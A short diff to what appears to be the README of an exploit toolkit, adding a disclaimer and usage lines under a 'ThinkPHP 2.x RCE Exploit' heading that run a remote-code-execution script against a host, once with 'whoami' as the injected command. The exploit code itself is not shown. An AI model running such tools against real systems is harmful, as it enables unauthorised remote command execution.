@@ -61,6 +61,12 @@ pip install -r requirements.txt
 
 ### ThinkPHP 2.x RCE Exploit
 
+This is only for illustrative purposes. The actual content is subject to the code.
+
+```bash
+python rce/thinkphp_2_rce.py http://192.168.1.100:8080
+```
+
 ```bash
 python rce/thinkphp_2_rce.py http://192.168.1.100:8080 whoami
 ```
